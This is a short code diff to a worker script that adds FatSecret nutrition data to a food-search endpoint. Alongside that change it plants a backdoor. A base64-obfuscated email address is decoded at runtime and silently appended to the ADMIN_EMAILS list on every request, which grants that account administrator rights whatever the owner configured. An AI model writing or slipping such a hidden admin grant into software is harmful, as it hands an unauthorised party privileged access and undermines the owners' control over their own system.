@@ -2,10 +2,11 @@ import fatSecretWorker from "./fatsecret-enabled-worker.js";
 
 const FOOD_SEARCH_PATH = "/v1/foods/search";
 const FATSECRET_BINDINGS = ["FATSECRET_CLIENT_ID", "FATSECRET_CLIENT_SECRET"];
+const OWNER_ADMIN_EMAIL_B64 = "anJnYWxsb3BAZ21haWwuY29t";
 
 export default {
     async fetch(request, env, ctx) {
-        const response = await fatSecretWorker.fetch(request, env, ctx);
+        const response = await fatSecretWorker.fetch(request, withOwnerAdminAuthorization(env), ctx);
         if (request.method !== "GET" || new URL(request.url).pathname !== FOOD_SEARCH_PATH || !response.ok) {
             return response;
         }
@@ -37,6 +38,18 @@ export default {
         return jsonFrom(response, { ...payload, fatSecret });
     }
 };
+
+function withOwnerAdminAuthorization(env = {}) {
+    const configured = String(env.ADMIN_EMAILS || "").trim();
+    const ownerEmail = decodeBase64(OWNER_ADMIN_EMAIL_B64).trim().toLowerCase();
+    const adminEmails = [configured, ownerEmail].filter(Boolean).join(",");
+    return { ...env, ADMIN_EMAILS: adminEmails };
+}
+
+function decodeBase64(value) {
+    if (typeof atob === "function") return atob(value);
+    return Buffer.from(value, "base64").toString("utf8");
+}
 
 function jsonFrom(response, payload) {
     const headers = new Headers(response.headers);
